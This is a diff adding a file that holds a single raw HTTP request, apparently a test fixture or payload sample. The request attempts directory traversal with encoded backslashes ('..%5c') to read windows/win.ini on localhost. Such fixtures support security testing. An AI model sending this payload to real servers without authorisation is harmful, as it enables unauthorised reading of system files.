@@ -1,0 +1,4 @@
+GET /..%5c..%5cwindows/win.ini HTTP/1.1
+Host: localhost
+Connection: close
+
